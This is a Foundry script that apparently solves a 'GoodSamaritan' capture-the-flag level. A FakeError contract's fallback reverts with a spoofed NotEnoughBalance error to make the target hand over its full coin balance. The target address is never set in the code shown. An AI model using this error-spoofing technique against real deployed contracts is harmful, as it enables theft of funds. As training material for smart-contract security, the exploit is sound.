pragma solidity >=0.8.0 <0.9.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {GoodSamaritan} from "src/GoodSamaritan.sol";

// for local testing
contract deploy is Script
{
    function run() external
    {
        vm.startBroadcast();

        GoodSamaritan goodSamaritan = new GoodSamaritan();
        console.log("deployed samaritan at", address(goodSamaritan));

        address wallet = address(goodSamaritan.wallet());
        address coin = address(goodSamaritan.coin());
        console.log("wallet addr:", wallet);
        console.log("coin addr:", coin);

        vm.stopBroadcast();
    }
}

contract attack is Script
{
    function run() external
    {
        vm.startBroadcast();

        FakeError exploit = new FakeError();
        bool success = exploit.requestDonation();

        // assert it's false
        console.log("success:", success);

        vm.stopBroadcast();
    }
}

// could be done nicer with an interface tho this solves it
contract FakeError
{
    error NotEnoughBalance();

    address samaritan; // instance address

    fallback() external payable
    {
//        bytes4 selector = bytes4(msg.data[:4]);
//        bytes4 notifySelector = 0x98d078b4;
        uint256 value = abi.decode(msg.data[4:], (uint256));

        // revert with the corresponding error if 10 coins are sent
        if (value == 10)
        {
            revert NotEnoughBalance();
        }
    }

    function requestDonation() external returns (bool)
    {
        return GoodSamaritan(samaritan).requestDonation();
    }
}

